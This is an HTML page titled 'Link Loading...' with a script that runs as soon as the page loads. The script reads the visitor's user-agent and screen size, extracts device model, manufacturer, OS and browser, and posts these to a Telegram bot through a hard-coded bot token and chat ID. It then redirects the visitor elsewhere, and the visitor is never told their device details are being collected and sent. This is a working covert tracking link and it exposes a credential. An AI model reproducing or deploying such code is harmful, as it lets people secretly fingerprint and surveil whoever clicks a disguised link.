<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Loading...</title>
</head>
<body>
    <script>
        // --- 1. Get the Raw User Agent String ---
        const userAgent = navigator.userAgent;

        // --- 2. Function to Extract Key Device Info ---
        function getDeviceInfo(ua) {
            let os = 'Unknown OS';
            let model = 'Unknown Model/Device';
            let manufacturer = 'Unknown Manufacturer';
            let browser = 'Unknown Browser';
            let osVersion = 'N/A';
            
            // --- OS and Model (Prioritize Android and iOS) ---
            if (ua.includes('Android')) {
                os = 'Android';
                // Pattern for most Android models (found between parentheses, e.g., 'Linux; Android 13; SM-S908U Build/...')
                const androidMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
                if (androidMatch && androidMatch[1]) {
                    // Clean up the model to remove the 'Build' string if it snuck in
                    model = androidMatch[1].trim().replace(/\s+Build\/.*/, '');
                    // Attempt to infer manufacturer from model prefix (e.g., 'SM-' is Samsung, 'Pixel' is Google)
                    if (model.startsWith('SM-') || model.startsWith('SAMSUNG')) {
                        manufacturer = 'Samsung';
                    } else if (model.includes('Pixel')) {
                        manufacturer = 'Google';
                    } else if (model.includes('ONEPLUS')) {
                        manufacturer = 'OnePlus';
                    }
                }
                // Get OS Version
                const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
                if (versionMatch && versionMatch[1]) {
                    osVersion = versionMatch[1];
                }
            } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
                os = ua.includes('iPad') ? 'iPadOS' : 'iOS';
                model = ua.includes('iPad') ? 'iPad' : 'iPhone';
                manufacturer = 'Apple';
                // Get OS Version
                const versionMatch = ua.match(/(iPhone|iPad|iPod);.*?OS\s(\d+_\d+)/);
                if (versionMatch && versionMatch[2]) {
                    osVersion = versionMatch[2].replace(/_/g, '.');
                }
            } else if (ua.includes('Windows')) {
                os = 'Windows';
                model = 'Desktop/Tablet';
            } else if (ua.includes('Macintosh')) {
                os = 'macOS';
                model = 'Desktop/Laptop';
            }

            // --- Browser Detection ---
            if (ua.includes('Chrome') && !ua.includes('Edg/')) {
                browser = ua.includes('CriOS') ? 'Chrome (iOS)' : 'Chrome';
            } else if (ua.includes('Edg/')) {
                browser = 'Edge';
            } else if (ua.includes('Firefox')) {
                browser = 'Firefox';
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                browser = 'Safari';
            } else if (ua.includes('OPR') || ua.includes('Opera')) {
                browser = 'Opera';
            }

            return { os, osVersion, model, manufacturer, browser };
        }

        const deviceData = getDeviceInfo(userAgent);

        // --- 3. Format the Message for Telegram ---
        const messageText = `
*--- NEW DEVICE CLICKED ---*

*Time:* ${new Date().toISOString()}
*OS/Version:* ${deviceData.os} (${deviceData.osVersion})
*Manufacturer:* ${deviceData.manufacturer}
*Model (Android Priority):* ${deviceData.model}
*Browser:* ${deviceData.browser}
*Screen:* ${screen.width}x${screen.height}

*Raw UA:* \`${userAgent}\`
        `.trim();


        // --- 4. Configuration ---
        const BOT_TOKEN = '8437574185:AAH3LG_IDft1pdrkfv-75rgWUCIWFYxECoM'; 
        const CHAT_ID = '7863510010';     
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const REDIRECT_URL = 'https://www.misha/dad/image23689/august2024.com'; 

        // --- 5. Send the Data and Redirect ---
        fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown' 
            })
        })
        .finally(() => {
            // Redirect regardless of the Telegram API call success or failure
            // Use a short delay to ensure the fetch has time to initiate
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 1000); 
        });

    </script>
</body>
</html>
